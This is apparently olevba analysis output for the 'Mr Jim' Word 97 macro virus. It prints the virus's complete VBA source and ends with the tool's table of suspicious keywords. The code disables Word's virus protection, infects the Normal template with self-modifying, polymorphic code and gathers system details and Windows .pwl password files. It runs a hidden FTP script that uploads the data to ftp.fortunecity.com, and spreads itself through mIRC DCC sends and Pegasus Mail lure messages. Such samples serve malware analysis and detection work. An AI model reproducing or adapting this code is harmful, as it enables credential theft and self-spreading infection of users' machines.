olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jim.b-173eafb55a08bacfa89ecb74caf357a1ddbe091c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jim.b-173eafb55a08bacfa89ecb74caf357a1ddbe091c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 































'  :  ÖÄÄùú :           ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·          : úùÄÄÄ·  :
'  ÈÄ :     ÈÄÄÄÄÄÄÄÄùú : [ Mr Jim/W97Macro Virus   ] : úùÄÄÄÄÄÄÄ¼      : Ä¼
'     ù                 ÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½ Started 99/03/XXù
'     ù                              -~BY~-         $$                   ù
'     ù  $$$$$$$$  $$$$$$$$$  $$$$$$$$   $$$$$$$$  $$$$   $$$$$$$$$      ù
'     ú $$$$$ $$$$ $$$$$     $$$$$ $$$$ $$$$$$$$$$  $$   $$$$$$ $$$$     ú
'       $$$$$      $$$$$     $$$$$ $$$$    $$$$          $$$$    $$$$
'        $$$$$$$$  $$$$$$$$$ $$$$$$$$$$    $$$$    $$$$  $$$$
'     ú       $$$$ $$$$$     $$$$$         $$$$    $$$$  $$$$    $$$$    ú
'       $$$$$ $$$$ $$$$$     $$$$$         $$$$    $$$$  $$$$$$ $$$$
'        $$$$$$$$  $$$$$$$$$ $$$$$         $$$$    $$$$   $$$$$$$$
'                       [Member of Technological Illusions]
'     ù  ** Stealth, Polymorphic, mIRC, Email, Espionaging virus **      ù
'     ù [----------------Some words from our sponsor-------------------] ù
'     ú [ Har du vad som krävs för att bli en international            ] ú
'ÖÄùú : [                      bussiness man?                          ] :úùÄ·
':    ÈÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¼   :
'ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄùú                  úùÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·
':    Greetz :                                                               :
'ú  Billy_Bel, Darkman, Techno_Phunc, Urgo32, Vecna, Veedee, Simon7          ú
'ú  Flitnic, Lord_Arz, Virus-X, Owl, T-2000, Griyo, Opic, Serial Killer      ú
'ù  The Lich, LovinGod, Yesnah                                       :
'ÈÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄùú                  úùÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¼
'41
Private Sub Document_Open()
'41
'On Error GoTo Host_infiltrated
'41
'It's not my intention to create holocaust, this is just an
'41
'experiment of mine (AI rocks ;)). Follow the instructions for vaccine!
'41
'create c:\_vac.txt for immunity.
'41
Mr_Jim_by_Septic:
'41
generation = 4
'41
check_vac = "c:\_vac.txt"
'41
If Dir(check_vac) <> "" Then MsgBox "I guess you have what it takes.", vbInformation, "[Mr Jim] By SeptiC/TI": GoTo Host_infiltrated
'41
da_normal = Dir(NormalTemplate.FullName)
'41
If da_normal = "" Then GoTo No_normal
'41
SetAttr NormalTemplate.FullName, vbNormal
'41
No_normal:
'41
Application.EnableCancelKey = wdCancelDisabled
'41
Options.VirusProtection = Chr$(48)
'41
Options.SaveNormalPrompt = Chr$(48)
'41
Options.ConfirmConversions = Chr$(48)
'41
Application.ScreenUpdating = Chr$(48)
'41
Application.DisplayStatusBar = Chr$(48)
'41
Application.DisplayAlerts = Chr$(48)
'41
windir = System.PrivateProfileString("c:\msdos.sys", "Paths", "WinDir")
'41
Dim Act_doc As Object: Set Act_doc = ActiveDocument
'41
Dim Act_norm As Object: Set Act_norm = NormalTemplate
'41
If Act_doc.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.CountOfLines > 360 Then act_inf = 1
'41
If Act_norm.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.CountOfLines > 360 Then normal_inf = 1
'41
infect_doc:
'41
If act_inf = 1 Then GoTo infect_normal
'41
Set a = Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'41
Set b = Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'41
Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, a.CountOfLines
'41
Set fix_lines_1 = b
'41
With fix_lines_1
'41
    code_1 = .Lines(1, .CountOfLines)
'41
End With
'41
Act_doc.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.insertlines 1, code_1
'41
Set polyit = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))
'41
temp_number = generation + 1
'41
With polyit.CodeModule
'41
    For da_line = 1 To 520 Step 2
'41
    If da_line < 55 Then GoTo stealth_poly
'41
    .replaceline da_line, "'" & Second(Now)
'41
stealth_poly:
'41
     Next da_line
'41
    .replaceline 300, "Sub ToolsMacro()"
'41
    .replaceline 328, "Private Sub Document_Close()"
'41
    .replaceline 56, "Private Sub Document_Open()"
'41
    .replaceline 68, "generation =" & temp_number
'41
 End With
'41
ActiveDocument.Save
'41
infect_normal:
'41
If normal_inf = 1 Then GoTo no_inf
'41
Set a = Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'41
Set b = Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'41
Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, b.CountOfLines
'41
Set fix_lines_2 = a
'41
With fix_lines_2
'41
    code_2 = .Lines(1, .CountOfLines)
'41
End With
'41
Act_norm.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.insertlines 1, code_2
'41
Set polyit = Act_norm.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))
'41
da_lines = 0
'41
With polyit.CodeModule
'41
    For da_line = 1 To 520 Step 2
'41
    If da_line < 55 Then GoTo stealth_poly_2
'41
    .replaceline da_line, "'" & Second(Now)
'41
stealth_poly_2:
'41
     Next da_line
'41
    .replaceline 300, "Sub ViewVBCode()"
'41
    .replaceline 56, "Private Sub Document_Close()"
'41
    .replaceline 328, "Private Sub Document_Open()"
'41
 End With
'41
NormalTemplate.Save
'41
no_inf:
'41
check_it = Dir("c:\config.dll")
'41
If check_it <> "" Then GoTo Host_infiltrated
'41
collect_i:
'41
user_name = Application.UserName
'41
info_1 = System.Application
'41
info_2 = System.Country
'41
info_3 = System.Creator
'41
info_4 = System.FreeDiskSpace
'41
info_5 = generation
'41
info_6 = System.ProcessorType
'41
info_7 = System.OperatingSystem
'41
With Application.FileSearch
'41
    .FileName = "\*.pwl"
'41
    .LookIn = windir
'41
    .SearchSubFolders = False
'41
    .MatchTextExactly = True
'41
    .FileType = msoFileTypeAllFiles
'41
    .Execute
'41
    passfile = .FoundFiles(Cos(Atn(CInt(1))))
'41
End With
'41
Open "c:\" & user_name & ".dll" For Append As #2
'41
Print #2, passfile
'41
Print #2, "User Name: "; user_name
'41
Print #2, "Time Infected: "; Time
'41
Print #2, "Application : "; info_1
'41
Print #2, "Country code : "; info_2
'41
Print #2, "Creator : "; info_3
'41
Print #2, "Free DiskSpace : "; info_4
'41
Print #2, "Generation of virus : "; info_5
'41
Print #2, "Processor Type : "; info_6
'41
Print #2, "Operating system : "; info_7
'41
Close #2
'41
SetAttr "c:\" & user_name & ".dll", vbHidden
'41
    Open "c:\msdos.dll" For Append As #1
'41
    Print #1, "o ftp.fortunecity.com"
'41
    Print #1, "user mrseptic"
'41
    Print #1, "nofb666"
'41
    Print #1, "binary"
'41
    Print #1, "put ""C:\" & user_name; ".dll"""
'41
    Print #1, "put """ & passfile; """"
'41
    Print #1, "quit"
'41
    Close #1
'41
SetAttr "c:\msdos.dll", vbHidden
'41
Open "c:\config.dll" For Append As #3
'41
Print #3, "BIG as usual in the future"
'41
Close #3
'41
Host_infiltrated:
'41
end_open:
'41
End Sub
'41
Sub ToolsMacro()
'41
On Error GoTo no_doc_stealth
'41
If ActiveDocument = "" Then GoTo no_doc_stealth
'41
Dim Act_doc As Object: Set Act_doc = ActiveDocument
'41
Set a = Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'41
Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, a.CountOfLines
'41
Act_doc.Saved = True
'41
no_doc_stealth:
'41
Dim Act_norm As Object: Set Act_norm = NormalTemplate
'41
Set b = Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'41
Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, b.CountOfLines
'41
Act_norm.Saved = True
'41
Application.ShowVisualBasicEditor = True
'41
End Sub
'41
Private Sub Document_Close()
'41
check_vac = "c:\_vac.txt"
'41
If Dir(check_vac) <> "" Then MsgBox "I guess you have what it takes.", vbInformation, "[Mr Jim] By SeptiC/TI": GoTo the_end
'41
On Error GoTo end_macro
'41
Options.VirusProtection = Chr$(48)
'41
Options.SaveNormalPrompt = Chr$(48)
'41
Options.ConfirmConversions = Chr$(48)
'41
Application.ScreenUpdating = Chr$(48)
'41
Application.DisplayStatusBar = Chr$(48)
'41
Application.DisplayAlerts = Chr$(48)
'41
windir = Environ("WINDIR") & "\"
'41
active_doc = ActiveDocument.FullName
'41
If Dir("c:\mirc32\mirc32.exe") <> "" Then set_dir = "c:\mirc32\": GoTo past_dir
'41
If Dir("c:\program~1\mirc32\mirc32.exe") <> "" Then set_dir = "c:\program~1\mirc32\": GoTo past_dir
'41
If Dir("c:\program\mirc32\mirc32.exe") <> "" Then set_dir = "c:\program\mirc32\": GoTo past_dir
'41
If Dir("c:\mirc\mirc32.exe") <> "" Then set_dir = "c:\mirc\": GoTo past_dir
'41
If Dir("c:\program~1\mirc\mirc32.exe") <> "" Then set_dir = "c:\program~1\mirc\": GoTo past_dir
'41
If Dir("c:\program\mirc\mirc32.exe") <> "" Then set_dir = "c:\program\mirc\": GoTo past_dir
'41
GoTo Pegasus
'41
past_dir:
'41
If set_dir = "c:\program\mirc32\" Then System.PrivateProfileString("C:\program\mirc32\mirc.ini", "ident", "userid") = "MrJim"
'41
If set_dir = "c:\program\mirc32\" Then System.PrivateProfileString("C:\program\mirc32\mirc.ini", "warn", "fserve") = "off"
'41
If set_dir = "c:\mirc32\" Then System.PrivateProfileString("c:\mirc32\mirc.ini", "ident", "userid") = "MrJim"
'41
If set_dir = "c:\mirc32\" Then System.PrivateProfileString("c:\mirc32\mirc.ini", "warn", "fserve") = "off"
'41
If set_dir = "c:\program~1\mirc32\" Then System.PrivateProfileString("c:\program~1\mirc32\mirc.ini", "ident", "userid") = "MrJim"
'41
If set_dir = "c:\program~1\mirc32\" Then System.PrivateProfileString("c:\program~1\mirc32\mirc.ini", "warn", "fserve") = "off"
'41
If set_dir = "c:\program\mirc\" Then System.PrivateProfileString("C:\program\mirc\mirc.ini", "ident", "userid") = "MrJim"
'41
If set_dir = "c:\program\mirc\" Then System.PrivateProfileString("C:\program\mirc\mirc.ini", "warn", "fserve") = "off"
'41
If set_dir = "c:\mirc\" Then System.PrivateProfileString("c:\mirc\mirc.ini", "ident", "userid") = "MrJim"
'41
If set_dir = "c:\mirc\" Then System.PrivateProfileString("c:\mirc\mirc.ini", "warn", "fserve") = "off"
'41
If set_dir = "c:\program~1\mirc\" Then System.PrivateProfileString("c:\program~1\mirc\mirc.ini", "ident", "userid") = "MrJim"
'41
If set_dir = "c:\program~1\mirc\" Then System.PrivateProfileString("c:\program~1\mirc\mirc.ini", "warn", "fserve") = "off"
'41
On Error GoTo Skip_attr
'41
SetAttr set_dir & "script.ini", vbNormal
'41
Kill set_dir & "script.ini"
'41
Skip_attr:
'41
On Error GoTo end_macro
'41
Open set_dir & "script.ini" For Append As #1
'41
Print #1, "[script]"
'41
Print #1, "n0=on 1:TEXT:*relaxa*:#:/msg $chan [MrJim/SeptiC/TI] - BIG as usual in the future"
'41
Print #1, "n1=on 1:TEXT:*hoppauppohajja*:#:/mode $chan +b $me"
'41
Print #1, "n2=on 1:TEXT:*progråtta*:#:/mode $chan +o $nick"
'41
Print #1, "n3=on 1:TEXT:*iframtiden*:#:/fserve $nick 20 c:\ config.sys"
'41
Print #1, "n4=on 1:FILESENT:*.*:if ( $me != $nick ) { /dcc send $nick " & active_doc; " }"
'41
Print #1, "n5=on 1:FILERCVD:*.*:if ( $me != $nick ) { /dcc send $nick " & active_doc; " }"
'41
Close #1
'41
Pegasus:
'41
If Dir("c:\pmail\winpm-32.exe") <> "" Then pega_dir = "c:\pmail\": GoTo past_pega_dir
'41
If Dir("c:\mail\winpm-32.exe") <> "" Then pega_dir = "c:\pmail\": GoTo past_pega_dir
'41
If Dir("c:\program~1\pmail\winpm-32.exe") <> "" Then pega_dir = "c:\program~1\pmail\": GoTo past_pega_dir
'41
If Dir("c:\program\pmail\winpm-32.exe") <> "" Then pega_dir = "c:\program\pmail\": GoTo past_pega_dir
'41
GoTo no_mail
'41
past_pega_dir:
'41
With Application.FileSearch
'41
    .FileName = "\*.pmw"
'41
    .LookIn = pega_dir
'41
    .SearchSubFolders = False
'41
    .MatchTextExactly = True
'41
    .FileType = msoFileTypeAllFiles
'41
    .Execute
'41
    pega_mail = .FoundFiles(Cos(Atn(CInt(1))))
'41
End With
'41
get_rand = Int(Rnd(5) * 5) + 1
'41
user_name = Application.UserName
'41
If get_rand = 1 Then random_message = "Hi! Quite some time has passed since my last mail, I hope you're not too mad at me. I haven't had time to write for several reasons. Anyway there is a quite interesting document attached in this mail, check it out and tell me what you think. Cya / " & user_name
'41
If get_rand = 2 Then random_message = "Hello, yesterday when I was surfing the web a friend told me about this great game. It's called Utopia, have you ever heard of it? It's very cool and I think you would like it, I found this beginners guide on the net, you need it incase you want to succed and become strong. The guide is attached to the message. Bye! / " & user_name
'41
If get_rand = 3 Then random_message = "HHHHhhhEEEeLLooo :) Somedays ago I was chatting on IRC on some warez channels and one guy offered me 3 different ftp sites with cracked versions of Quake III arena, all of them works! In case you doesn't have mIRC installed, install it! It's a very cool chat program. The Ftp's login and password are attached to this message. Ok Cya / " & user_name
'41
If get_rand = 4 Then random_message = "Hiya, I really need your help. This document has to be done for friday and it probably contains a lot of misspellings etc etc. Could you please read it trough and check if you see something? / " & user_name
'41
If get_rand = 5 Then random_message = "Hehehe guess what I found! Tons of XXX passwords and some other cool stuff, it's attached to the message. Have fun ;) / " & user_name
'41
If pega_mail = "" Then GoTo no_mail
'41
Open pega_mail For Input As #2
'41
Line Input #2, mail_line1
'41
Line Input #2, mail_line2
'41
Line Input #2, mail_line3
'41
Line Input #2, mail_line4
'41
Line Input #2, mail_line5
'41
Close #2
'41
file_Ready:
'41
random_1 = Int(Rnd(1) * 10000) + 1
'41
Open pega_dir & "\mail\" & random_1 & ".pmw" For Append As #3
'41
Print #3, mail_line1
'41
Print #3, "SY:0"
'41
Print #3, mail_line3
'41
Print #3, mail_line5
'41
Print #3, "CC:"
'41
Print #3, "EN:0"
'41
Print #3, "CS:0"
'41
Print #3, "RC:0"
'41
Print #3, "DC:0"
'41
Print #3, "UR:0"
'41
Print #3, "SS:0"
'41
Print #3, "SG:0"
'41
Print #3, "MI:1"
'41
Print #3, "ID:<Default>"
'41
Print #3, "EX:0"
'41
Print #3, "AT:" & active_doc; ",Binary,1"
'41
Print #3, "RT: 1"
'3
Print #3, "FL:0"
'3
Print #3, ""
'3
Print #3, random_message
'3
Close #3
'3
no_mail:
'3
For x = 1 To Application.Tasks.Count
'3
If UCase(Application.Tasks(x).Name) = "ADDRESS BOOK" Then da_outlook = Application.Tasks(x).Name: GoTo out_look
'3
If UCase(Application.Tasks(x).Name) = "ICQMSGAPI WINDOW" Then GoTo i_connection
'3
If UCase(Application.Tasks(x).Name) = "SOCKETS WINDOW" Then GoTo i_connection
'3
If UCase(Application.Tasks(x).Name) = "SECTION WINDOW" Then GoTo i_connection
'10
If UCase(Application.Tasks(x).Name) = "INTERNET EXPLORER" Then GoTo i_connection
'10
Next x
'10
GoTo end_macro
'10
out_look:
'10
i_connection:
'10
Shell "command.com /c ftp.exe -n -s:c:\msdos.dll", vbHide
'10
end_macro:
'10
If Day(Now) = 2 Then GoTo payload
'10
GoTo the_end
'10
payload:
'10
Selection.TypeText Text:="[Mr Jim/SeptiC/TI] - Do you have what it takes to become an international bussiness man!?"

Selection.TypeParagraph

Selection.TypeParagraph

ActiveDocument.Shapes.AddTextEffect(msoTextEffect29, _
"[Mr Jim]/SeptiC/TI '99" & Chr(13) & "" & Chr(10) & "", "Arial Black", 36#, msoFalse, msoFalse, 121.85 _
, 159.75).Select
   
If ActiveWindow.View.SplitSpecial = wdPaneNone Then
ActiveWindow.ActivePane.View.Type = wdNormalView
Else

ActiveWindow.View.Type = wdNormalView
End If

the_end:

End Sub











































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |config.dll          |Executable file name                         |
|IOC       |msdos.dll           |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |32.exe              |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

